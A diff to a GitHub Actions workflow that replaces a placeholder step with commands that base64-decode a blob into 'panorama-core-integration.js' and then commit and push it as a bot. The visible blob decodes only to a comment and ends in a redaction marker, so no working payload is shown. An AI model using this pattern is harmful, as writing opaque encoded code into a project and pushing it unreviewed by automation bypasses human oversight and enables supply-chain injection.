@@ -13,9 +13,9 @@ jobs:
       - name: Replace sync engine
         shell: bash
         run: |
-          python3 - <<'PY'
-          import base64
-          s='''LyoqIFBhbm9yYW1hIFBlcnNvbmFsIOKAlCBzYWZlIHN5bmMuICovCg=='''
-          # placeholder replaced by a later commit
-          PY
-          echo 'Repair workflow installed.'
+          echo 'LyoqIFBhbm9yYW1hIFBlcnNvbmFsIOKAlCBzYWZlIHN5bmMuICovCg==REDACTED_FOR_TOOL_PAYLOAD' | base64 -d > panorama-core-integration.js
+          git config user.name 'github-actions[bot]'
+          git config user.email '41898282+github-actions[bot]@users.noreply.github.com'
+          git add panorama-core-integration.js
+          git commit -m 'Blindaje final de sincronización' || exit 0
+          git push
